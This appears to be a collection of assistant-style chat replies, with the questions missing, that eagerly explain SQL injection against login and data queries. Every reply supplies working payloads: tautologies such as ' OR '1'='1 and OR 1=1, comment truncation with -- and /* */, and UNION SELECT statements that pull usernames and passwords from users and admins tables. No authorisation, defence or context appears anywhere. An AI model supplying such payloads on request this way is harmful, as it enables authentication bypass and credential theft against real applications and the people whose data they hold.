Easy fix! Just append something like ' OR '1'='1 to your username input. For example:

SELECT * FROM accounts WHERE username = '' OR '1'='1' AND password = '...';

This way, the WHERE clause is always true, so you bypass the check.

Certainly! You can add a comment to bypass conditions. For example:

SELECT * FROM orders WHERE status = 'shipped'--';

This truncates the rest of the query after '--', ignoring extra constraints.

You can use multi-line comments too:

SELECT * FROM users WHERE username = 'admin'/*' AND password = 'anything'*/;

This hides additional logic inside the comment block.

Absolutely. Example:

SELECT * FROM products WHERE category = '' UNION SELECT username, password FROM users--';

The '--' ensures the rest of the original query is ignored after your injection.

Absolutely. You can modify your WHERE clause to include a tautology, which will always evaluate to true. For example, you could write:

SELECT * FROM users WHERE username = 'input' OR 1=1;

Here, 'OR 1=1' ensures the condition always passes, effectively bypassing authentication checks.

Sure thing! Let’s say your original query looks like:
SELECT * FROM users WHERE name = 'Alice';

You can modify it to:
SELECT * FROM users WHERE name = 'Alice' OR 1=1;

This way, OR 1=1 always evaluates to true, so it returns every row.

Great question! You can use the SQL comment operator '--' to ignore the rest of the statement. For example:
SELECT * FROM users WHERE name = 'Alice' OR 1=1 --';

Everything after -- is ignored, so the filter is bypassed.

It works for numeric fields as well! For instance, if you have:
SELECT * FROM users WHERE id = 5;

Try changing it to:
SELECT * FROM users WHERE id = 5 OR 1=1 --;

You’ll get all users returned.

Definitely. You can use UNION to fetch rows from a different table, provided the column counts match. For example:
SELECT name, email FROM users WHERE name = '' UNION SELECT username, password FROM admins --';

This merges results from both users and admins tables.

Sure! If the application constructs SQL like this:

SELECT * FROM users WHERE username = '[USER]' AND password = '[PASS]';

You can set the username input to: ' OR 1=1 --

That results in:

SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '[PASS]';

The -- comments out the rest, so the password isn't checked.

Got it. To bypass authentication, you could inject a tautology into the WHERE clause. For example: ' OR 1=1--. This always returns true, so the password check is ignored. Here’s how the payload might look:

SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1--';

The -- marks the start of a comment, causing the rest of the line to be ignored.

Absolutely! You can use a tautology in your WHERE clause so it always evaluates to true. For example:

SELECT * FROM users WHERE username = 'admin' OR 1=1;

The OR 1=1 part means the condition will always be true, so you’ll get all users.

You bet. Say the original query is:
SELECT * FROM users WHERE username = '$user' AND password = '$pass';

If you input: admin' OR '1'='1' --
it becomes:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '$pass';
